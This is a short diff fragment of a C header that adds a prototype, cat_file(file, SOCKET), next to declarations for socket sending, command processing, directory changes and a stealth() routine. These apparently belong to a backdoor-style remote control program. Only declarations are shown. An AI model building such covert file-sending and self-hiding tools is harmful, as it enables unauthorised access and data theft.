@@ -41,4 +41,5 @@ int setupvar(fileWrapper * file);
 int sendbuf(SOCKET s, char * buf, int size);
 int processdata(SOCKET s, char cmd, char cmd2);
 void change_dir(char * dir);
+int cat_file(char * file, SOCKET s);
 void stealth();
